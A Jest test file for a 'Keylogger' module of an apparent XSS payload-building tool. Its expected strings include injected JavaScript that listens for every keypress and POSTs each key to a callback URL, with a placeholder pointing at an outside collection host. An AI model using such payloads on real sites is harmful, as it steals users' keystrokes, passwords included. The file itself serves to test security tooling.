import { cook, init, render, validate } from './Keylogger'
import { shallow } from 'enzyme'

describe('Keylogger', () => {
  const instance = {
    callbackUrl: 'http://127.0.0.1/log'
  }

  describe('.cook', () => {
    it('should declare a handler for the `keypress` event', () => {
      const payload = cook(instance, {
        payload: '__XSS_CHEF_ENTRY_POINT__'
      }).payload

      expect(payload).toEqual(
        expect.stringContaining(
          `document.addEventListener('keypress', function (e) {`
        )
      )
    })

    it('should make an AJAX request for each key press', () => {
      const payload = cook(instance, {
        payload: '__XSS_CHEF_ENTRY_POINT__'
      }).payload

      expect(payload).toEqual(
        expect.stringContaining(
          `ajaxRequest('POST', 'http://127.0.0.1/log', 'key=' + e.key)`
        )
      )
    })

    it('should declare the next entry point at the end of the payload', () => {
      const payload = cook(instance, {
        payload: '__XSS_CHEF_ENTRY_POINT__'
      }).payload

      expect(payload).toMatch(/__XSS_CHEF_ENTRY_POINT__$/)
    })
  })

  describe('.init', () => {
    it('should define {callbackUrl}', () => {
      expect(init().callbackUrl).toBeDefined()
    })
  })

  describe('.render', () => {
    const setRecipeProperty = jest.fn()

    it('should render a RecipeTextField for the callback URL`', () => {
      const wrapper = shallow(render(instance, setRecipeProperty))
      const textField = wrapper.find('RecipeTextField[bindTo="callbackUrl"]')
      expect(textField).toHaveLength(1)
      expect(textField.props()).toEqual({
        bindTo: 'callbackUrl',
        instance: instance,
        label: 'Callback URL',
        placeholder: 'Example: http://your.domain.com/logData',
        setRecipeProperty: setRecipeProperty
      })
    })
  })

  describe('.validate', () => {
    describe('if `instance.callbackUrl` is empty', () => {
      it('should return false', () => {
        const valid = validate({
          callbackUrl: '',
          resource: '/'
        })
        expect(valid).toBe(false)
      })
    })

    describe('if all checks pass', () => {
      it('should return true', () => {
        const valid = validate({
          callbackUrl: 'http://127.0.0.1',
          resource: '/'
        })

        expect(valid).toBe(true)
      })
    })
  })
})
